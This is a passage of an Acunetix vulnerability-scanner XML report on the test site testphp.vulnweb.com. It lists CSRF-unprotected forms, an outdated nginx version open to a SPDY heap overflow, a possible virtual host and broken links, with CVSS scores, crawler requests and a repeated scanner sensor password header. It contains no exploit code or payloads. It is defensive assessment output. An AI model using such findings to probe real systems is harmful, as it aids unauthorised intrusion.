          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="13" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">fComment</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/comment.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>name [Text]</li><li>comment [TextArea]</li><li>Submit [Submit]</li><li>phpaction [Hidden]</li></ul>]]></Details>
       <Affects><![CDATA[/comment.php (1c5c505530b26c709422c7cf9a33ea84)]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /comment.php?aid=3 HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/artists.php
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:09 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 1252
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="14" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">&lt;empty&gt;</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/hpp/params.php?p=valid&amp;pp=12</font><br/>Form method: <font color="navy">GET</font><br/><br/>Form inputs:<br/><ul><li>aaaa [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/hpp (fbc1d56ba0737d3fa577aa5a19c9fd49)]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/?pp=12 HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/hpp/
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:11 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 383
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="15" color="red">
       <Name><![CDATA[nginx SPDY heap buffer overflow]]></Name>
       <ModuleName><![CDATA[Scripting (Version_Check.script)]]></ModuleName>
       <Details><![CDATA[Current version is : <font color="dark">nginx/1.4.1</font>]]></Details>
       <Affects><![CDATA[Web Server]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[An attacker can cause a heap memory buffer overflow in a worker process by using a specially crafted request, potentially
resulting in arbitrary code execution ]]></Impact>
       <Description><![CDATA[A heap-based buffer overflow in the SPDY implementation in nginx 1.3.15 before 1.4.7 and 1.5.x before 1.5.12 allows remote attackers to execute arbitrary code via a crafted request. The problem affects nginx compiled with the ngx_http_spdy_module module (which is not compiled by default) and without --with-debug configure option, if the &quot;spdy&quot; option of the &quot;listen&quot; directive is used in a configuration file.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Upgrade nginx to the latest version of apply the patch provided by the vendor.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[]]></Request>
        <Response><![CDATA[]]></Response>
       </TechnicalDetails>
       <CWE id="122"><![CDATA[CWE-122]]></CWE>
       <CVEList>
        <CVE>
          <Id><![CDATA[CVE-2014-0133]]></Id>
        </CVE>
       </CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:P/I:P/A:P/E:POC/RL:OF]]></Descriptor>
          <Score><![CDATA[5.1]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[Proof of concept code]]></E>
          <Edesc><![CDATA[Proof-of-concept exploit code or an attack demonstration that is not practical for most systems is available. The code or technique is not functional in all situations and may require substantial modification by a skilled attacker.]]></Edesc>
          <RL><![CDATA[Official fix]]></RL>
          <RLdesc><![CDATA[A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available.]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[nginx security advisory (CVE-2014-0133)]]></Database>
          <URL><![CDATA[http://mailman.nginx.org/pipermail/nginx-announce/2014/000135.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[nginx patch]]></Database>
          <URL><![CDATA[http://nginx.org/download/patch.2014.spdy2.txt]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="16" color="blue">
       <Name><![CDATA[Possible virtual host found]]></Name>
       <ModuleName><![CDATA[Scripting (VirtualHost_Audit.script)]]></ModuleName>
       <Details><![CDATA[VirtualHost: <font color="dark"><b>localhost</b></font><br/>Response: <pre wrap="virtual"><font color="blue">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Welcome to nginx!&lt;/title&gt;
&lt;style&gt;
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;
&lt;p&gt;If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.&lt;/p&gt;

&lt;p&gt;For online documentation and support please refer to
&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;
Commercial support is available at
&lt;a href</font></pre>]]></Details>
       <Affects><![CDATA[localhost]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers). This allows one server to share its resources, such as memory and processor cycles, without requiring all services provided to use the same host name. <br/><br/>
This web server is responding differently when the Host header is manipulated and various common virtual hosts are tested. This could indicate there is a Virtual Host present.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Consult the virtual host configuration and check if this virtual host should be publicly accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET / HTTP/1.1
Host: localhost
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:44:09 GMT
Content-Type: text/html
Last-Modified: Mon, 06 May 2013 11:30:13 GMT
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 612
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Virtual hosting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Virtual_hosting]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="17" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/medias/js/common_functions.js]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /medias/js/common_functions.js HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/path-disclosure-unix.html
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:45:46 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 570
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="18" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/medias/css/main.css]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /medias/css/main.css HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/pictures/path-disclosure-unix.html
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Cookie: mycookie=3
